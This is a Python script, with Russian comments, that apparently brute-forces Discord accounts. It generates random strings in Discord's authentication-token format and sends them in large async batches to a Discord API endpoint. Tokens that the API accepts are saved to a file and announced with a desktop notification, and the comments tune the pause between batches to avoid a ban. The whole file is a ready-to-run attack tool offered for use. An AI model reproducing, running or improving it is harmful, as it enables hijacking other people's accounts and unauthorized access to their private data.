import time
import base64
import string

import asyncio, aiohttp
from random import randint, choices

from art import tprint
from colorama import Fore
from plyer import notification

# Если True, выводит в консоль все сгенерированные токены, если False, то только валидные
# Отключение немного ускоряет работу скрипта 
PRINT_ALL_TOKENS = False

PACKETS_COUNT = 0           # сколько будет генерироваться пакетов с токенами, 0 для бесконечной работы.
TOKENS_IN_PACKET = 1000     # сколько будет токенов в одном пакете запросов, рекомендуется 100-1000.
TIMEOUT = 2                 # время простоя между запросами пакетов в секундах, чтобы не забанил api дискорда, желательно ставить хотя бы 1 секунду


TITLE = "TOKEN GENERATOR"
def gen_first():
    sample_string = str(randint(000000000000000000, 999999999999999999))
    encodedBytes = base64.b64encode(sample_string.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    return encodedid
def gen_second():
    return ''.join(choices("XY")+choices(string.ascii_letters + string.digits + "-_", k=5))
def gen_third():
    return ''.join(choices(string.ascii_letters + string.digits + "-_", k=27))

def notify(title, message):
    try: notification.notify(title = title, message = message,  app_icon="./nitro.ico")
    except: pass

valid_tokens_count = 0
url = "https://discordapp.com/api/v6/users/@me/library"
async def check(token, session):
    global valid_tokens_count
    async with session.get(url, headers={'Content-Type': 'application/json', 'authorization': token}) as res:
        if res.status != 200:
            if PRINT_ALL_TOKENS:
                return f"{Fore.RED}{token} : INVALID{Fore.RESET}"
            return f"{Fore.RED}В пачке нет валидных токенов...{Fore.RESET}"
        elif res.status == 200:
            with open("Valid tokens.txt", "a") as file:
                file.write(token)
            valid_tokens_count += 1
            notify(TITLE, "Найден новый валидный токен!")
            return f"{Fore.GREEN}{token} : VALID{Fore.RESET}"

checked_tokens_count = 0
async def main():
    global checked_tokens_count
    async with aiohttp.ClientSession() as session:
        if PACKETS_COUNT:
            for i in range(PACKETS_COUNT):
                tasks = []
                for j in range(TOKENS_IN_PACKET):
                    token = f"{gen_first()}.{gen_second()}.{gen_third()}"
                    tasks.append(asyncio.ensure_future(check(token, session)))
                tokens = set(await asyncio.gather(*tasks))
                checked_tokens_count += TOKENS_IN_PACKET
                for token in tokens:
                    print(token)
                await asyncio.sleep(TIMEOUT)
        else:
            while True:
                tasks = []
                for j in range(TOKENS_IN_PACKET):
                    token = f"{gen_first()}.{gen_second()}.{gen_third()}"
                    tasks.append(asyncio.ensure_future(check(token, session)))
                tokens = set(await asyncio.gather(*tasks))
                checked_tokens_count += TOKENS_IN_PACKET
                for token in tokens:
                    print(token)
                await asyncio.sleep(TIMEOUT) 

if __name__ == "__main__":
    tprint(TITLE, font='modular')
    start_time = time.time()
    try:
        asyncio.get_event_loop().run_until_complete(main())
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}Работа скрипта прервана пользователем, Кол-во валидных токенов: {Fore.GREEN if valid_tokens_count>1 else Fore.RED}{valid_tokens_count}{Fore.YELLOW}/{checked_tokens_count}{Fore.RESET}")
    else:
        print(f"{Fore.YELLOW}Cкрипт завершил свою работу, Кол-во валидных токенов: {Fore.GREEN if valid_tokens_count>1 else Fore.RED}{valid_tokens_count}{Fore.YELLOW}/{checked_tokens_count}{Fore.RESET}")
    finally:
        notify(TITLE, "Cкрипт завершил свою работу!")
        print(f"{Fore.YELLOW}----- Время работы скрипта - {time.time() - start_time} секунд -----{Fore.RESET}")